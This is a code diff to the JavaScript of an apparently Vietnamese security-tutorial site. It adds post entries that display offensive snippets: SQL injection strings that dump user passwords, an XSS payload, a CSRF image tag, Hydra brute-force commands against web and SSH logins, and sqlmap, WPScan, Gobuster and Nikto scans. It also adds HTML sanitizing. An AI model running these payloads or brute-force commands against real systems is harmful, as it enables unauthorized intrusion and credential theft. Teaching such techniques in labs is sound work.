@@ -11,8 +11,28 @@ const posts = {
   tutorials: [
     {
       title: "SQL Injection cơ bản",
-      content: "Hướng dẫn cách khai thác SQL Injection trên web app không an toàn.",
+      content: "Hướng dẫn khai thác SQL Injection trong lab DVWA.",
       code: "' OR '1'='1\n' UNION SELECT null, username, password FROM users --"
+    },
+    {
+      title: "XSS cơ bản",
+      content: "Demo Stored XSS trong form comment.",
+      code: `<script>alert('XSS')</script>`
+    },
+    {
+      title: "CSRF Attack",
+      content: "Ví dụ gửi request thay đổi mật khẩu qua link CSRF.",
+      code: `<img src="http://victim.com/change_pass?pw=hacked">`
+    },
+    {
+      title: "Brute Force với Hydra",
+      content: "Cách brute-force form login bằng Hydra.",
+      code: `hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"`
+    },
+    {
+      title: "Directory Enumeration",
+      content: "Tìm hidden folder với Gobuster.",
+      code: `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`
     }
   ],
 
@@ -33,9 +53,40 @@ for port in range(1,1000):
     except:
         pass`,
       filename: "port_scanner.py"
+    },
+    {
+      title: "SQLMap Demo",
+      content: "Tool tự động khai thác SQLi.",
+      code: `sqlmap -u "http://target.com/index.php?id=1" --dbs`,
+      filename: "sqlmap_demo.sh"
+    },
+    {
+      title: "WPScan",
+      content: "Scan lỗ hổng WordPress.",
+      code: `wpscan --url http://target.com --enumerate u,vp`,
+      filename: "wpscan.sh"
+    },
+    {
+      title: "Hydra Bruteforce",
+      content: "Demo brute force SSH với Hydra.",
+      code: `hydra -l root -P rockyou.txt ssh://192.168.1.100`,
+      filename: "hydra_ssh.sh"
+    },
+    {
+      title: "Nikto Scanner",
+      content: "Quét lỗ hổng web với Nikto.",
+      code: `nikto -h http://target.com`,
+      filename: "nikto.sh"
     }
   ]
 };
+
+// ================== SANITIZE ==================
+function sanitizeHTML(str) {
+  const temp = document.createElement("div");
+  temp.textContent = str;
+  return temp.innerHTML;
+}
 
 // ================== RENDER POSTS ==================
 function renderPosts() {
@@ -44,9 +95,9 @@ function renderPosts() {
   posts.news.forEach(post => {
     newsContainer.innerHTML += `
       <div class="card">
-        <h2>📡 ${post.title}</h2>
-        <p>${post.content}</p>
-        <a href="${post.link}" target="_blank">
+        <h2>📡 ${sanitizeHTML(post.title)}</h2>
+        <p>${sanitizeHTML(post.content)}</p>
+        <a href="${sanitizeHTML(post.link)}" target="_blank" rel="noopener noreferrer">
           <button class="btn read-btn">🔗 Read More</button>
         </a>
       </div>`;
@@ -58,10 +109,15 @@ function renderPosts() {
     const pre = document.createElement("pre");
     const code = document.createElement("code");
     code.className = "language-sql";
-    code.textContent = post.code;
+    code.textContent = post.code.replace(/<script.*?>.*?<\/script>/gi, "");
     pre.appendChild(code);
 
-    tutContainer.appendChild(makeCard(post.title, post.content, pre, post.code));
+    tutContainer.appendChild(makeCard(
+      sanitizeHTML(post.title),
+      sanitizeHTML(post.content),
+      pre,
+      post.code
+    ));
   });
 
   // Tools
@@ -69,13 +125,18 @@ function renderPosts() {
   posts.tools.forEach(post => {
     const pre = document.createElement("pre");
     const code = document.createElement("code");
-    code.className = "language-python";
-    code.textContent = post.code; // giữ nguyên format
+    code.className = "language-bash";
+    code.textContent = post.code.replace(/<script.*?>.*?<\/script>/gi, "");
     pre.appendChild(code);
 
-    toolContainer.appendChild(makeCard(post.title, post.content, pre, post.code, post.filename));
+    toolContainer.appendChild(makeCard(
+      sanitizeHTML(post.title),
+      sanitizeHTML(post.content),
+      pre,
+      post.code,
+      sanitizeHTML(post.filename)
+    ));
   });
-
 
   hljs.highlightAll();
 }
